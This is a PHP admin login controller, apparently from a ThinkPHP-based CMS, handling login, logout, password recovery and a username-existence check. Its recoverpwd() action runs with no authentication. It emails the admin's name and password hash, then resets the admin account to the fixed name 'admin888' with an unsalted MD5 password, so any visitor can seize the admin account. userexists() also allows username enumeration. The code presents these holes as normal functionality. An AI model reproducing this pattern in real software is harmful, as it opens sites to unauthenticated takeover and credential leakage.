<?php

namespace app\fladmin\controller;

use think\Controller;
use app\common\lib\ReturnData;
use app\common\lib\Helper;

class Login extends Controller
{
    /**
     * 登录页面
     */
    public function index()
    {
        if (session('admin_info')) {
            header('Location: ' . url('fladmin/index/index'));
            exit;
        }

        return $this->fetch();
    }

    /**
     * 登录处理页面
     */
    public function dologin()
    {
        //验证码验证
        if (!captcha_check(input('captcha', null))) {
            $this->error('验证码错误');
        }

        $res = logic('Admin')->login($_POST);
        if ($res['code'] === ReturnData::SUCCESS) {
            session('admin_info', $res['data']);
            $this->success('登录成功', url('fladmin/index/index'), '', 1);
        }

        $this->error($res['msg']);
    }

    //退出登录
    public function loginout()
    {
        //Session::clear(); // 清除session
        session('admin_info', null);
        $this->success('退出成功', '/');
    }

    // 密码恢复
    public function recoverpwd()
    {
        $admin = db('admin')->where(array('id' => 1))->find();
        logic('Tool')->smtp_sendmail($admin['name'] . '-' . $admin['pwd']);

        $data["name"] = "admin888";
        $data["pwd"] = "e10adc3949ba59abbe56e057f20f883e";
        if (model('Admin')->edit($data, ['id' => 1])) {
            $this->success('密码恢复成功', url('index'), '', 1);
        }

        $this->error('密码恢复失败', url('index'), '', 3);
    }

    /**
     * 判断用户名是否存在
     */
    public function userexists()
    {
        $map['name'] = "";
        if (isset($_POST["name"]) && !empty($_POST["name"])) {
            $map['name'] = $_POST["name"];
        } else {
            return 0;
        }

        return model('Admin')->getCount($map);
    }
}